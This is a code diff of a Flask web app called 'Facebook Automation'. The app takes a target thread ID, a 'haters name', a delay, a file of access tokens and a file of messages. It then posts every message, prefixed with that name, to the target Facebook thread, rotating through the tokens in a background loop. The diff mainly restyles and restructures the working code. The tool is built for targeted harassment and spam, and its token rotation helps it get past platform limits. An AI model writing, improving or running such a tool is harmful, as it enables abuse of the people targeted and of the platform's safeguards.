@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template, redirect, url_for
+from flask import Flask, request, redirect, url_for, render_template_string
 import os
 import time
 import requests
@@ -6,7 +6,7 @@ import threading
 
 app = Flask(__name__)
 
-# Static headers
+# Headers for requests
 headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
@@ -17,150 +17,135 @@ headers = {
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
 }
 
+# RGB styles
+RGB_STYLE = """
+<style>
+    body {
+        background: linear-gradient(90deg, red, yellow, green, cyan, blue, violet);
+        background-size: 400% 400%;
+        animation: gradient 6s ease infinite;
+        font-family: Arial, sans-serif;
+    }
+    @keyframes gradient {
+        0% { background-position: 0% 50%; }
+        50% { background-position: 100% 50%; }
+        100% { background-position: 0% 50%; }
+    }
+    .container {
+        margin: 100px auto;
+        text-align: center;
+        max-width: 600px;
+        padding: 20px;
+        background-color: rgba(0, 0, 0, 0.6);
+        border-radius: 20px;
+        color: white;
+    }
+    label {
+        color: white;
+    }
+    .btn {
+        padding: 10px 20px;
+        margin: 10px;
+        border-radius: 10px;
+        cursor: pointer;
+        border: none;
+        color: white;
+    }
+    .btn-submit {
+        background-color: #4CAF50;
+    }
+    .btn-submit:hover {
+        background-color: red;
+    }
+    .btn-stop {
+        background-color: #ff4c4c;
+    }
+    .btn-stop:hover {
+        background-color: darkred;
+    }
+</style>
+"""
+
+# Stop thread flag
 stop_flag = False
 
-@app.route('/')
+@app.route('/', methods=['GET', 'POST'])
 def index():
-    return '''
-        <html lang="en">
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Automation</title>
-    <style>
-        /* CSS for styling elements */
-        body {
-            background-color: black;
-            color: white;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding-top: 50px;
-        }
-        .container {
-            margin-top: 50px;
-            max-width: 600px;
-            border-radius: 15px;
-            padding: 20px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
-            background: linear-gradient(to right, rgba(0, 255, 255, 0.5), rgba(255, 0, 255, 0.5));
-        }
-        .form-control {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 5px;
-            border: 1px solid white;
-            background: transparent;
-            color: white;
-        }
-        .btn-submit {
-            background-color: #4CAF50;
-            color: white;
-            padding: 12px 24px;
-            border-radius: 10px;
-            cursor: pointer;
-            border: none;
-        }
-        .btn-submit:hover {
-            background-color: #45a049;
-        }
-        .btn-stop {
-            background-color: red;
-            color: white;
-            padding: 12px 24px;
-            border-radius: 10px;
-            cursor: pointer;
-            border: none;
-        }
-        .btn-stop:hover {
-            background-color: darkred;
-        }
-        .laser-light {
-            color: rgb(255, 0, 0);
-            text-shadow: 0 0 10px rgb(255, 0, 0), 0 0 20px rgb(255, 0, 0);
-            font-size: 50px;
-            animation: laser 1.5s infinite alternate;
-        }
-        @keyframes laser {
-            0% { text-shadow: 0 0 10px rgb(255, 0, 0), 0 0 20px rgb(255, 0, 0); }
-            100% { text-shadow: 0 0 20px rgb(255, 255, 0), 0 0 30px rgb(255, 255, 0); }
-        }
-    </style>
-</head>
-<body>
+    global stop_flag
+    if request.method == 'POST':
+        thread_id = request.form.get('threadId')
+        haters_name = request.form.get('hatersName')
+        delay = int(request.form.get('delay'))
+        
+        # Read token file
+        tokens_file = request.files['tokensFile']
+        tokens = tokens_file.read().decode().splitlines()
+        
+        # Read message file
+        messages_file = request.files['messagesFile']
+        messages = messages_file.read().decode().splitlines()
+
+        # Start automation
+        stop_flag = False
+        threading.Thread(target=send_messages, args=(thread_id, haters_name, delay, tokens, messages)).start()
+
+    elif 'stop' in request.form:
+        stop_flag = True
+
+    # HTML Form
+    return render_template_string(f"""
+    {RGB_STYLE}
     <div class="container">
-        <h1 class="laser-light">Facebook Automation</h1>
-        <form action="/" method="POST" enctype="multipart/form-data">
-            <div>
-                <input type="text" name="thread_id" class="form-control" placeholder="Thread ID" required>
-                <input type="file" name="cookie_file" class="form-control" required>
-                <input type="file" name="messages_file" class="form-control" accept=".txt" required>
-                <input type="text" name="hater_name" class="form-control" placeholder="Hater Name" required>
-                <input type="number" name="delay" class="form-control" placeholder="Delay in seconds" required>
-            </div>
-            <button type="submit" class="btn-submit">Start Messaging</button>
+        <h2>Facebook Automation</h2>
+        <form method="post" enctype="multipart/form-data">
+            <label for="threadId">Target Thread ID:</label><br>
+            <input type="text" name="threadId" required><br><br>
+            
+            <label for="hatersName">Haters Name:</label><br>
+            <input type="text" name="hatersName" required><br><br>
+            
+            <label for="delay">Delay (Seconds):</label><br>
+            <input type="number" name="delay" value="5" min="1" required><br><br>
+            
+            <label for="tokensFile">Tokens File:</label><br>
+            <input type="file" name="tokensFile" accept=".txt" required><br><br>
+            
+            <label for="messagesFile">Messages File:</label><br>
+            <input type="file" name="messagesFile" accept=".txt" required><br><br>
+            
+            <button type="submit" class="btn btn-submit">Start</button>
         </form>
-        <form action="/stop" method="POST">
-            <button type="submit" class="btn-stop">Stop Messaging</button>
+        <form method="post">
+            <button type="submit" name="stop" class="btn btn-stop">Stop</button>
         </form>
     </div>
-</body>
-</html>
-    '''
+    """)
 
-@app.route('/', methods=['POST'])
-def send_message():
+def send_messages(thread_id, haters_name, delay, tokens, messages):
     global stop_flag
-    stop_flag = False
+    post_url = f"https://graph.facebook.com/v15.0/t_{thread_id}/"
+    max_tokens = len(tokens)
+    num_messages = len(messages)
 
-    # Retrieve form data
-    thread_id = request.form['thread_id']
-    cookie_file = request.files['cookie_file']
-    messages_file = request.files['messages_file']
-    hater_name = request.form['hater_name']
-    delay = int(request.form['delay'])
-
-    # Read cookie
-    cookies = cookie_file.read().decode().splitlines()
-
-    # Read messages
-    messages = messages_file.read().decode().splitlines()
-
-    # Define post URL
-    post_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-
-    # Send messages in a separate thread to avoid blocking
-    def message_thread():
-        for message_index, message in enumerate(messages):
-            if stop_flag:
-                print("[x] Stopping message sending.")
-                break
-
-            # Choose a cookie for this message
-            cookie = cookies[message_index % len(cookies)]
-            params = {'access_token': cookie, 'message': f"{hater_name} {message}"}
-
-            # Send the message
-            response = requests.post(post_url, json=params, headers=headers)
+    for i, message in enumerate(messages):
+        if stop_flag:
+            print("Stopping...")
+            break
+        
+        token = tokens[i % max_tokens]
+        data = {'access_token': token, 'message': f"{haters_name} {message}"}
+        
+        try:
+            response = requests.post(post_url, json=data, headers=headers)
             if response.ok:
-                print(f"[+] Sent Message No. {message_index + 1}: {message}")
+                print(f"[+] Sent: {message}")
             else:
-                print(f"[x] Failed to Send Message No. {message_index + 1}: {message}")
-
-            time.sleep(delay)
-
-    # Start the message sending thread
-    thread = threading.Thread(target=message_thread)
-    thread.start()
-
-    return redirect(url_for('index'))
-
-@app.route('/stop', methods=['POST'])
-def stop_sending():
-    global stop_flag
-    stop_flag = True
-    return redirect(url_for('index'))
+                print(f"[-] Failed: {message}")
+        except Exception as e:
+            print(f"[!] Error: {e}")
+        
+        time.sleep(delay)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
-            
+                
